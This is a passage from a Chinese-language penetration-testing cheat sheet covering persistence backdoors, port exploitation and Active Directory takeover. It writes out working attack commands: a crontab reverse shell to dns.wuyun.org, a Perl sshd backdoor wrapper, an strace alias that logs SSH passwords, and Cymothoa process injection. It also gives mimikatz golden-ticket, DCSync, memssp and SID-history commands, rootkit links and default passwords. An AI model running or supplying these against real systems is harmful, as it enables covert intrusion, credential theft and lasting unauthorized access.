<h5 id="26、Windows-FAX-DLL-Injection"><a href="#26、Windows-FAX-DLL-Injection" class="headerlink" title="26、Windows FAX DLL Injection"></a>26、Windows FAX DLL Injection</h5><p>通过DLL劫持，劫持Explorer.exe对<code>fxsst.dll</code>的加载<br>Explorer.exe在启动时会加载<code>c:\Windows\System32\fxsst.dll</code>(服务默认开启，用于传真服务)将payload.dll保存在<code>c:\Windows\fxsst.dll</code>，能够实现dll劫持，劫持Explorer.exe对<code>fxsst.dll</code>的加载</p>
<h5 id="27、特殊注册表键值"><a href="#27、特殊注册表键值" class="headerlink" title="27、特殊注册表键值"></a>27、特殊注册表键值</h5><p>在注册表启动项创建特殊名称的注册表键值，用户正常情况下无法读取(使用Win32 API)，但系统能够执行(使用Native API)。<br><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%9A%90%E8%97%8F-%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9A%84%E5%88%9B%E5%BB%BA/" target="_blank" rel="noopener">《渗透技巧——“隐藏”注册表的创建》</a><br><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%9A%90%E8%97%8F-%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9A%84%E6%9B%B4%E5%A4%9A%E6%B5%8B%E8%AF%95/" target="_blank" rel="noopener">《渗透技巧——“隐藏”注册表的更多测试》</a></p>
<h5 id="28、快捷方式后门"><a href="#28、快捷方式后门" class="headerlink" title="28、快捷方式后门"></a>28、快捷方式后门</h5><p>替换我的电脑快捷方式启动参数<br>POC : <a href="https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Backdoor/LNK_backdoor.ps1" target="_blank" rel="noopener">https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Backdoor/LNK_backdoor.ps1</a></p>
<h5 id="29、Logon-Scripts"><a href="#29、Logon-Scripts" class="headerlink" title="29、Logon Scripts"></a>29、<a href="https://3gstudent.github.io/3gstudent.github.io/Use-Logon-Scripts-to-maintain-persistence/" target="_blank" rel="noopener">Logon Scripts</a></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">New-ItemProperty &quot;HKCU:\Environment\&quot; UserInitMprLogonScript -value &quot;c:\test\11.bat&quot; -propertyType string | Out-Null</span><br></pre></td></tr></table></figure>
<h5 id="30、Password-Filter-DLL"><a href="#30、Password-Filter-DLL" class="headerlink" title="30、Password Filter DLL"></a>30、<a href="https://3gstudent.github.io/3gstudent.github.io/Password-Filter-DLL%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/" target="_blank" rel="noopener">Password Filter DLL</a></h5><h5 id="31、利用BHO实现IE浏览器劫持"><a href="#31、利用BHO实现IE浏览器劫持" class="headerlink" title="31、利用BHO实现IE浏览器劫持"></a>31、<a href="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8BHO%E5%AE%9E%E7%8E%B0IE%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8A%AB%E6%8C%81/" target="_blank" rel="noopener">利用BHO实现IE浏览器劫持</a></h5><h4 id="Linux-2"><a href="#Linux-2" class="headerlink" title="Linux"></a>Linux</h4><h5 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h5><p>每60分钟反弹一次shell给dns.wuyun.org的53端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!bash</span><br><span class="line">(crontab -l;printf &quot;*&#x2F;60 * * * * exec 9&lt;&gt; &#x2F;dev&#x2F;tcp&#x2F;dns.wuyun.org&#x2F;53;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;&#x2F;bin&#x2F;bash --noprofile -i;\rno crontab for &#96;whoami&#96;%100c\n&quot;)|crontab -</span><br></pre></td></tr></table></figure>
<h5 id="硬链接sshd"><a href="#硬链接sshd" class="headerlink" title="硬链接sshd"></a>硬链接sshd</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!bash</span><br><span class="line">ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;su; &#x2F;tmp&#x2F;su -oPort&#x3D;2333;</span><br></pre></td></tr></table></figure>
<p>链接：ssh <a href="mailto:root@192.168.206.142">root@192.168.206.142</a> -p 2333</p>
<h5 id="SSH-Server-wrapper"><a href="#SSH-Server-wrapper" class="headerlink" title="SSH Server wrapper"></a>SSH Server wrapper</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!bash</span><br><span class="line">cd &#x2F;usr&#x2F;sbin</span><br><span class="line">mv sshd ..&#x2F;bin</span><br><span class="line">echo &#39;#!&#x2F;usr&#x2F;bin&#x2F;perl&#39; &gt;sshd</span><br><span class="line">echo &#39;exec &quot;&#x2F;bin&#x2F;sh&quot; if (getpeername(STDIN) &#x3D;~ &#x2F;^..4A&#x2F;);&#39; &gt;&gt;sshd</span><br><span class="line">echo &#39;exec &#123;&quot;&#x2F;usr&#x2F;bin&#x2F;sshd&quot;&#125; &quot;&#x2F;usr&#x2F;sbin&#x2F;sshd&quot;,@ARGV,&#39; &gt;&gt;sshd</span><br><span class="line">chmod u+x sshd</span><br><span class="line">&#x2F;&#x2F;不用重启也行</span><br><span class="line">&#x2F;etc&#x2F;init.d&#x2F;sshd restart</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">socat STDIO TCP4:192.168.206.142:22,sourceport&#x3D;13377</span><br></pre></td></tr></table></figure>
<h5 id="SSH-keylogger"><a href="#SSH-keylogger" class="headerlink" title="SSH keylogger"></a>SSH keylogger</h5><p>vim当前用户下的.bashrc文件,末尾添加</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!bash</span><br><span class="line">alias ssh&#x3D;&#39;strace -o &#x2F;tmp&#x2F;sshpwd-&#96;date &#39;+%d%h%m%s&#39;&#96;.log -e read,write,connect -s2048 ssh&#39;</span><br></pre></td></tr></table></figure>
<p>source .bashrc</p>
<h5 id="Cymothoa-进程注入backdoor"><a href="#Cymothoa-进程注入backdoor" class="headerlink" title="Cymothoa_进程注入backdoor"></a>Cymothoa_进程注入backdoor</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;cymothoa -p 2270 -s 1 -y 7777</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -vv ip 7777</span><br></pre></td></tr></table></figure>
<h5 id="rootkit"><a href="#rootkit" class="headerlink" title="rootkit"></a>rootkit</h5><p><a href="http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz" target="_blank" rel="noopener">openssh_rootkit</a><br><a href="http://core.ipsecs.com/rootkit/kernel-rootkit/ipsecs-kbeast-v1.tar.gz" target="_blank" rel="noopener">Kbeast_rootkit </a><br>Mafix + Suterusu rootkit</p>
<h5 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h5><p><a href="https://github.com/Screetsec/Vegile" target="_blank" rel="noopener">Vegile </a><br><a href="https://github.com/icco/backdoor" target="_blank" rel="noopener">backdoor </a></p>
<h3 id="WEB后门"><a href="#WEB后门" class="headerlink" title="WEB后门"></a>WEB后门</h3><p>PHP Meterpreter后门<br>Aspx Meterpreter后门<br>weevely<br>webacoo<br>….</p>
<h2 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h2><h3 id="端口渗透"><a href="#端口渗透" class="headerlink" title="端口渗透"></a>端口渗透</h3><h4 id="端口扫描-1"><a href="#端口扫描-1" class="headerlink" title="端口扫描"></a>端口扫描</h4><ul>
<li>1.端口的指纹信息（版本信息） </li>
<li>2.端口所对应运行的服务  </li>
<li>3.常见的默认端口号  </li>
<li>4.尝试弱口令 </li>
</ul>
<h4 id="端口爆破"><a href="#端口爆破" class="headerlink" title="端口爆破"></a>端口爆破</h4><p><a href="https://github.com/vanhauser-thc/thc-hydra" target="_blank" rel="noopener">hydra </a></p>
<h4 id="端口弱口令"><a href="#端口弱口令" class="headerlink" title="端口弱口令"></a>端口弱口令</h4><ul>
<li>NTScan  </li>
<li>Hscan  </li>
<li>自写脚本 </li>
</ul>
<h4 id="端口溢出"><a href="#端口溢出" class="headerlink" title="端口溢出"></a>端口溢出</h4><p><strong>smb</strong></p>
<ul>
<li>ms08067 </li>
<li>ms17010 </li>
<li>ms11058 </li>
<li>… </li>
</ul>
<p><strong>apache</strong><br><strong>ftp</strong><br><strong>…</strong></p>
<h4 id="常见的默认端口"><a href="#常见的默认端口" class="headerlink" title="常见的默认端口"></a>常见的默认端口</h4><h5 id="1、web类-web漏洞-敏感目录"><a href="#1、web类-web漏洞-敏感目录" class="headerlink" title="1、web类(web漏洞/敏感目录)"></a>1、web类(web漏洞/敏感目录)</h5><p>第三方通用组件漏洞: struts thinkphp jboss ganglia zabbix …</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">80 web </span><br><span class="line">80-89 web </span><br><span class="line">8000-9090 web</span><br></pre></td></tr></table></figure>
<h5 id="2、数据库类-扫描弱口令"><a href="#2、数据库类-扫描弱口令" class="headerlink" title="2、数据库类(扫描弱口令)"></a>2、数据库类(扫描弱口令)</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1433 MSSQL </span><br><span class="line">1521 Oracle </span><br><span class="line">3306 MySQL </span><br><span class="line">5432 PostgreSQL </span><br><span class="line">50000 DB2</span><br></pre></td></tr></table></figure>
<h5 id="3、特殊服务类-未授权-命令执行类-漏洞"><a href="#3、特殊服务类-未授权-命令执行类-漏洞" class="headerlink" title="3、特殊服务类(未授权/命令执行类/漏洞)"></a>3、特殊服务类(未授权/命令执行类/漏洞)</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">443 SSL心脏滴血 </span><br><span class="line">445 ms08067&#x2F;ms11058&#x2F;ms17010等 </span><br><span class="line">873 Rsync未授权 </span><br><span class="line">5984 CouchDB http:&#x2F;&#x2F;xxx:5984&#x2F;_utils&#x2F; </span><br><span class="line">6379 redis未授权 </span><br><span class="line">7001,7002 WebLogic默认弱口令，反序列 </span><br><span class="line">9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 </span><br><span class="line">11211 memcache未授权访问 </span><br><span class="line">27017,27018 Mongodb未授权访问 </span><br><span class="line">50000 SAP命令执行 </span><br><span class="line">50070,50030 hadoop默认端口未授权访问</span><br></pre></td></tr></table></figure>
<h5 id="4、常用端口类-扫描弱口令-端口爆破"><a href="#4、常用端口类-扫描弱口令-端口爆破" class="headerlink" title="4、常用端口类(扫描弱口令/端口爆破)"></a>4、常用端口类(扫描弱口令/端口爆破)</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">21 ftp </span><br><span class="line">22 SSH </span><br><span class="line">23 Telnet </span><br><span class="line">445 SMB弱口令扫描 </span><br><span class="line">2601,2604 zebra路由，默认密码zebra </span><br><span class="line">3389 远程桌面</span><br></pre></td></tr></table></figure>
<h5 id="5、端口合计所对应的服务"><a href="#5、端口合计所对应的服务" class="headerlink" title="5、端口合计所对应的服务"></a>5、端口合计所对应的服务</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">21 ftp </span><br><span class="line">22 SSH </span><br><span class="line">23 Telnet </span><br><span class="line">25 SMTP </span><br><span class="line">53 DNS </span><br><span class="line">69 TFTP </span><br><span class="line">80 web </span><br><span class="line">80-89 web </span><br><span class="line">110 POP3 </span><br><span class="line">135 RPC </span><br><span class="line">139 NETBIOS </span><br><span class="line">143 IMAP </span><br><span class="line">161 SNMP </span><br><span class="line">389 LDAP </span><br><span class="line">443 SSL心脏滴血以及一些web漏洞测试 </span><br><span class="line">445 SMB </span><br><span class="line">512,513,514 Rexec </span><br><span class="line">873 Rsync未授权 </span><br><span class="line">1025,111 NFS </span><br><span class="line">1080 socks </span><br><span class="line">1158 ORACLE EMCTL2601,2604 zebra路由，默认密码zebra案 </span><br><span class="line">1433 MSSQL (暴力破解) </span><br><span class="line">1521 Oracle:(iSqlPlus Port:5560,7778) </span><br><span class="line">2082&#x2F;2083 cpanel主机管理系统登陆 （国外用较多） </span><br><span class="line">2222 DA虚拟主机管理系统登陆 （国外用较多） </span><br><span class="line">2601,2604 zebra路由，默认密码zebra </span><br><span class="line">3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了 </span><br><span class="line">3306 MySQL （暴力破解） </span><br><span class="line">3312&#x2F;3311 kangle主机管理系统登陆 </span><br><span class="line">3389 远程桌面 </span><br><span class="line">3690 svn </span><br><span class="line">4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网 </span><br><span class="line">4848 GlassFish web中间件 弱口令:admin&#x2F;adminadmin </span><br><span class="line">5432 PostgreSQL </span><br><span class="line">5900 vnc </span><br><span class="line">5984 CouchDB http:&#x2F;&#x2F;xxx:5984&#x2F;_utils&#x2F; </span><br><span class="line">6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网 </span><br><span class="line">6379 redis未授权 </span><br><span class="line">7001,7002 WebLogic默认弱口令，反序列 </span><br><span class="line">7778 Kloxo主机控制面板登录 </span><br><span class="line">8000-9090 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上 </span><br><span class="line">8080 tomcat&#x2F;WDCd&#x2F; 主机管理系统，默认弱口令 </span><br><span class="line">8080,8089,9090 JBOSS </span><br><span class="line">8081 Symantec AV&#x2F;Filter for MSE </span><br><span class="line">8083 Vestacp主机管理系统 （国外用较多） </span><br><span class="line">8649 ganglia </span><br><span class="line">8888 amh&#x2F;LuManager 主机管理系统默认端口 </span><br><span class="line">9000 fcgi fcig php执行 </span><br><span class="line">9043 websphere[web中间件] 弱口令: admin&#x2F;admin websphere&#x2F; websphere ststem&#x2F;manager </span><br><span class="line">9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 </span><br><span class="line">10000 Virtualmin&#x2F;Webmin 服务器虚拟主机管理系统 </span><br><span class="line">11211 memcache未授权访问 </span><br><span class="line">27017,27018 Mongodb未授权访问 </span><br><span class="line">28017 mongodb统计页面 </span><br><span class="line">50000 SAP命令执行 </span><br><span class="line">50060 hadoop </span><br><span class="line">50070,50030 hadoop默认端口未授权访问</span><br></pre></td></tr></table></figure>
<h3 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h3><h4 id="信息搜集-1"><a href="#信息搜集-1" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>powerview.ps1 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-NetDomain - gets the name of the current user&#39;s domain</span><br><span class="line">Get-NetForest - gets the forest associated with the current user&#39;s domain</span><br><span class="line">Get-NetForestDomains - gets all domains for the current forest</span><br><span class="line">Get-NetDomainControllers - gets the domain controllers for the current computer&#39;s domain</span><br><span class="line">Get-NetCurrentUser - gets the current [domain\]username</span><br><span class="line">Get-NetUser - returns all user objects, or the user specified (wildcard specifiable)</span><br><span class="line">Get-NetUserSPNs - gets all user ServicePrincipalNames</span><br><span class="line">Get-NetOUs - gets data for domain organization units</span><br><span class="line">Get-NetGUIDOUs - finds domain OUs linked to a specific GUID</span><br><span class="line">Invoke-NetUserAdd - adds a local or domain user</span><br><span class="line">Get-NetGroups - gets a list of all current groups in the domain</span><br><span class="line">Get-NetGroup - gets data for each user in a specified domain group</span><br><span class="line">Get-NetLocalGroups - gets a list of localgroups on a remote host or hosts</span><br><span class="line">Get-NetLocalGroup - gets the members of a localgroup on a remote host or hosts</span><br><span class="line">Get-NetLocalServices - gets a list of running services&#x2F;paths on a remote host or hosts</span><br><span class="line">Invoke-NetGroupUserAdd - adds a user to a specified local or domain group</span><br><span class="line">Get-NetComputers - gets a list of all current servers in the domain</span><br><span class="line">Get-NetFileServers - get a list of file servers used by current domain users</span><br><span class="line">Get-NetShare - gets share information for a specified server</span><br><span class="line">Get-NetLoggedon - gets users actively logged onto a specified server</span><br><span class="line">Get-NetSessions - gets active sessions on a specified server</span><br><span class="line">Get-NetFileSessions - returned combined Get-NetSessions and Get-NetFiles</span><br><span class="line">Get-NetConnections - gets active connections to a specific server resource (share)</span><br><span class="line">Get-NetFiles - gets open files on a server</span><br><span class="line">Get-NetProcesses - gets the remote processes and owners on a remote server</span><br></pre></td></tr></table></figure>
<p>BloodHound<br>​            </p>
<h4 id="获取域控的方法"><a href="#获取域控的方法" class="headerlink" title="获取域控的方法"></a>获取域控的方法</h4><h5 id="SYSVOL"><a href="#SYSVOL" class="headerlink" title="SYSVOL"></a>SYSVOL</h5><p>SYSVOL是指存储域公共文件服务器副本的共享文件夹，它们在域中所有的域控制器之间复制。 Sysvol文件夹是安装AD时创建的，它用来存放GPO、Script等信息。同时，存放在Sysvol文件夹中的信息，会复制到域中所有DC上。<br>相关阅读: </p>
<ul>
<li><a href="http://www.freebuf.com/vuls/92016.html" target="_blank" rel="noopener">寻找SYSVOL里的密码和攻击GPP（组策略偏好） </a></li>
<li><a href="http://blog.51cto.com/ycrsjxy/203095" target="_blank" rel="noopener">Windows Server 2008 R2之四管理Sysvol文件夹 </a></li>
<li><a href="https://adsecurity.org/?p=2288" target="_blank" rel="noopener">SYSVOL中查找密码并利用组策略首选项 </a></li>
<li><a href="https://xz.aliyun.com/t/1653" target="_blank" rel="noopener">利用SYSVOL还原组策略中保存的密码</a> </li>
</ul>
<h5 id="MS14-068-Kerberos"><a href="#MS14-068-Kerberos" class="headerlink" title="MS14-068 Kerberos"></a>MS14-068 Kerberos</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python ms14-068.py -u 域用户@域名 -p 密码 -s 用户SID -d 域主机</span><br></pre></td></tr></table></figure>
<p>利用mimikatz将工具得到的<a href="mailto:TGT_domainuser@SERVER.COM.ccache">TGT_domainuser@SERVER.COM.ccache</a>写入内存，创建缓存证书：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptc c:TGT_darthsidious@pentest.com.ccache&quot; exit</span><br><span class="line">net use k: \pentest.comc$</span><br></pre></td></tr></table></figure>
<p>相关阅读 :</p>
<ul>
<li><a href="http://adsecurity.org/?p=676" target="_blank" rel="noopener">Kerberos的工具包PyKEK</a> </li>
<li><a href="http://www.freebuf.com/vuls/56081.html" target="_blank" rel="noopener">深入解读MS14-068漏洞</a> </li>
<li><a href="https://adsecurity.org/?p=541" target="_blank" rel="noopener">Kerberos的安全漏洞</a> </li>
</ul>
<h5 id="SPN扫描"><a href="#SPN扫描" class="headerlink" title="SPN扫描"></a>SPN扫描</h5><p>Kerberoast可以作为一个有效的方法从Active Directory中以普通用户的身份提取服务帐户凭据，无需向目标系统发送任何数据包。<br>SPN是服务在使用Kerberos身份验证的网络上的唯一标识符。它由服务类，主机名和端口组成。在使用Kerberos身份验证的网络中，必须在内置计算机帐户（如NetworkService或LocalSystem）或用户帐户下为服务器注册SPN。对于内部帐户，SPN将自动进行注册。但是，如果在域用户帐户下运行服务，则必须为要使用的帐户的手动注册SPN。<br>SPN扫描的主要好处是，SPN扫描不需要连接到网络上的每个IP来检查服务端口，SPN通过LDAP查询向域控执行服务发现，SPN查询是Kerberos的票据行为一部分，因此比较难检测SPN扫描。<br>相关阅读 :</p>
<ul>
<li><a href="https://blog.netspi.com/locate-and-attack-domain-sql-servers-without-scanning/" target="_blank" rel="noopener">非扫描式的SQL Server发现</a> </li>
<li><a href="https://adsecurity.org/?p=1508" target="_blank" rel="noopener">SPN扫描</a> </li>
<li><a href="https://github.com/PyroTek3/PowerShell-AD-Recon" target="_blank" rel="noopener">扫描SQLServer的脚本</a> </li>
</ul>
<h5 id="Kerberos的黄金门票"><a href="#Kerberos的黄金门票" class="headerlink" title="Kerberos的黄金门票"></a>Kerberos的黄金门票</h5><p>在域上抓取的哈希</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lsadump::dcsync &#x2F;domain:pentest.com &#x2F;user:krbtgt</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kerberos::purge</span><br><span class="line">kerberos::golden &#x2F;admin:administrator &#x2F;domain:域 &#x2F;sid:SID &#x2F;krbtgt:hash值 &#x2F;ticket:adinistrator.kiribi</span><br><span class="line">kerberos::ptt administrator.kiribi</span><br><span class="line">kerberos::tgt</span><br><span class="line">net use k: \pnet use k: \pentest.comc$</span><br></pre></td></tr></table></figure>
<p>相关阅读 :</p>
<ul>
<li><a href="https://adsecurity.org/?p=1640" target="_blank" rel="noopener">https://adsecurity.org/?p=1640</a> </li>
<li><a href="http://bobao.360.cn/learning/detail/3564.html" target="_blank" rel="noopener">域服务账号破解实践</a> </li>
<li><a href="https://blog.csdn.net/wulantian/article/details/42418231" target="_blank" rel="noopener">Kerberos的认证原理</a> </li>
<li><a href="https://klionsec.github.io/2016/08/10/ntlm-kerberos/" target="_blank" rel="noopener">深刻理解windows安全认证机制ntlm＆Kerberos</a> </li>
</ul>
<h5 id="Kerberos的银票务"><a href="#Kerberos的银票务" class="headerlink" title="Kerberos的银票务"></a>Kerberos的银票务</h5><p>黄金票据和白银票据的一些区别：<br>Golden Ticket：伪造<code>TGT</code>，可以获取<code>任何Kerberos</code>服务权限<br>银票：伪造TGS，<code>只能访问指定的服务</code><br>加密方式不同：<br>Golden Ticket由<code>krbtgt</code>的hash加密<br>Silver Ticket由<code>服务账号</code>（通常为计算机账户）Hash加密<br>认证流程不同：<br>金票在使用的过程需要同域控通信<br>银票在使用的过程不需要同域控通信<br>相关阅读 :</p>
<ul>
<li><a href="https://adsecurity.org/?p=2011" target="_blank" rel="noopener">攻击者如何使用Kerberos的银票来利用系统</a> </li>
<li><a href="https://www.feiworks.com/wy/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Pass%20The%20Ticket.pdf" target="_blank" rel="noopener">域渗透——Pass The Ticket</a></li>
</ul>
<h5 id="域服务账号破解"><a href="#域服务账号破解" class="headerlink" title="域服务账号破解"></a>域服务账号破解</h5><p>与上面SPN扫描类似的原理<br><a href="https://github.com/nidem/kerberoast" target="_blank" rel="noopener">https://github.com/nidem/kerberoast</a><br>获取所有用作SPN的帐户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">setspn -T PENTEST.com -Q *&#x2F;*</span><br></pre></td></tr></table></figure>
<p>从Mimikatz的RAM中提取获得的门票</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kerberos::list &#x2F;export</span><br></pre></td></tr></table></figure>
<p>用rgsrepcrack破解</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi</span><br></pre></td></tr></table></figure>
<h5 id="凭证盗窃"><a href="#凭证盗窃" class="headerlink" title="凭证盗窃"></a>凭证盗窃</h5><p>从搜集的密码里面找管理员的密码 </p>
<h5 id="地址解析协议"><a href="#地址解析协议" class="headerlink" title="地址解析协议"></a>地址解析协议</h5><p>实在搞不定再搞ARP<br>​    </p>
<h4 id="获取AD哈希"><a href="#获取AD哈希" class="headerlink" title="获取AD哈希"></a>获取AD哈希</h4><ul>
<li>使用VSS卷影副本 </li>
<li>Ntdsutil中获取NTDS.DIT​​文件 </li>
<li>PowerShell中提取NTDS.DIT –&gt;<a href="https://github.com/clymb3r/PowerShell/tree/master/Invoke-NinjaCopy" target="_blank" rel="noopener">Invoke-NinaCopy </a></li>
<li>使用Mimikatz提取 </li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz lsadump::lsa &#x2F;inject exit</span><br></pre></td></tr></table></figure>
<ul>
<li>使用PowerShell Mimikatz</li>
<li>使用Mimikatz的DCSync 远程转储Active Directory凭证<br>提取 KRBTGT用户帐户的密码数据：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mimikatz &quot;privilege::debug&quot; &quot;lsadump::dcsync &#x2F;domain:rd.adsecurity.org &#x2F;user：krbtgt&quot;exit</span><br></pre></td></tr></table></figure>
<p>管理员用户帐户提取密码数据：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mimikatz &quot;privilege::debug&quot; &quot;lsadump::dcsync &#x2F;domain:rd.adsecurity.org &#x2F;user：Administrator&quot; exit</span><br></pre></td></tr></table></figure>
<ul>
<li>NTDS.dit中提取哈希<br>使用esedbexport恢复以后使用ntdsxtract提取 </li>
</ul>
<h4 id="AD持久化"><a href="#AD持久化" class="headerlink" title="AD持久化"></a>AD持久化</h4><h5 id="活动目录持久性技巧"><a href="#活动目录持久性技巧" class="headerlink" title="活动目录持久性技巧"></a>活动目录持久性技巧</h5><p><a href="https://adsecurity.org/?p=1929" target="_blank" rel="noopener">https://adsecurity.org/?p=1929</a><br>DS恢复模式密码维护<br>DSRM密码同步 </p>
<blockquote>
<p>Windows Server 2008 需要安装KB961320补丁才支持DSRM密码同步，Windows Server 2003不支持DSRM密码同步。KB961320:<a href="https://support.microsoft.com/en-us/help/961320/a-feature-is-available-for-windows-server-2008-that-lets-you-synchroni,可参考：[巧用DSRM密码同步将域控权限持久化](http://drops.xmd5.com/static/drops/tips-9297.html)" target="_blank" rel="noopener">https://support.microsoft.com/en-us/help/961320/a-feature-is-available-for-windows-server-2008-that-lets-you-synchroni,可参考：[巧用DSRM密码同步将域控权限持久化](http://drops.xmd5.com/static/drops/tips-9297.html)</a></p>
</blockquote>
<p><a href="https://www.dcshadow.com/" target="_blank" rel="noopener">DCshadow </a></p>
<h5 id="Security-Support-Provider"><a href="#Security-Support-Provider" class="headerlink" title="Security Support Provider"></a>Security Support Provider</h5><p>简单的理解为SSP就是一个DLL，用来实现身份认证</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">misc::memssp</span><br></pre></td></tr></table></figure>
<p>这样就不需要重启<code>c:/windows/system32</code>可看到新生成的文件kiwissp.log</p>
<h5 id="SID-History"><a href="#SID-History" class="headerlink" title="SID History"></a><a href="https://adsecurity.org/?p=1772" target="_blank" rel="noopener">SID History</a></h5><p>SID历史记录允许另一个帐户的访问被有效地克隆到另一个帐户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz &quot;privilege::debug&quot; &quot;misc::addsid bobafett ADSAdministrator&quot;</span><br></pre></td></tr></table></figure>
<h5 id="AdminSDHolder＆SDProp"><a href="#AdminSDHolder＆SDProp" class="headerlink" title="AdminSDHolder＆SDProp "></a><a href="https://adsecurity.org/?p=1906" target="_blank" rel="noopener">AdminSDHolder＆SDProp </a></h5><p>利用AdminSDHolder＆SDProp（重新）获取域管理权限 </p>
<h5 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h5><p><a href="https://adsecurity.org/?p=2716" target="_blank" rel="noopener">https://adsecurity.org/?p=2716</a><br><a href="https://www.anquanke.com/post/id/86531" target="_blank" rel="noopener">策略对象在持久化及横向渗透中的应用</a> </p>
<h5 id="Hook-PasswordChangeNotify"><a href="#Hook-PasswordChangeNotify" class="headerlink" title="Hook PasswordChangeNotify"></a>Hook PasswordChangeNotify</h5><p><a href="http://wooyun.jozxing.cc/static/drops/tips-13079.html" target="_blank" rel="noopener">http://wooyun.jozxing.cc/static/drops/tips-13079.html</a> </p>
<h4 id="TIPS"><a href="#TIPS" class="headerlink" title="TIPS"></a>TIPS</h4><p><a href="https://github.com/3gstudent/Dump-Clear-Password-after-KB2871997-installed" target="_blank" rel="noopener">《域渗透——Dump Clear-Text Password after KB2871997 installed》</a><br><a href="http://www.vuln.cn/6812" target="_blank" rel="noopener">《域渗透——Hook PasswordChangeNotify》</a> </p>
<blockquote>
<p>可通过Hook PasswordChangeNotify实时记录域控管理员的新密码 </p>
</blockquote>
<p><a href="http://www.liuhaihua.cn/archives/179102.html" target="_blank" rel="noopener">《域渗透——Local Administrator Password Solution》 </a></p>
<blockquote>
<p>域渗透时要记得留意域内主机的本地管理员账号 </p>
</blockquote>
<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8SYSVOL%E8%BF%98%E5%8E%9F%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/" target="_blank" rel="noopener">《域渗透——利用SYSVOL还原组策略中保存的密码》 </a></p>
<h4 id="相关工具"><a href="#相关工具" class="headerlink" title="相关工具"></a>相关工具</h4><p><a href="https://github.com/BloodHoundAD/BloodHound" target="_blank" rel="noopener">BloodHound </a><br><a href="https://github.com/byt3bl33d3r/CrackMapExec" target="_blank" rel="noopener">CrackMapExec </a><br><a href="https://github.com/byt3bl33d3r/DeathStar" target="_blank" rel="noopener">DeathStar</a> </p>
<blockquote>
<p>利用过程：<a href="http://www.freebuf.com/sectool/160884.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/160884.html</a> </p>
</blockquote>
<h3 id="在远程系统上执行程序"><a href="#在远程系统上执行程序" class="headerlink" title="在远程系统上执行程序"></a>在远程系统上执行程序</h3><ul>
<li>At </li>
<li>Psexec </li>
<li>WMIC </li>
<li>Wmiexec </li>
<li>Smbexec </li>
<li>Powershell remoting </li>
<li>DCOM </li>
</ul>
<h3 id="IOT相关"><a href="#IOT相关" class="headerlink" title="IOT相关"></a>IOT相关</h3><ul>
<li>1、路由器 <a href="https://github.com/reverse-shell/routersploit" target="_blank" rel="noopener">routersploit </a></li>
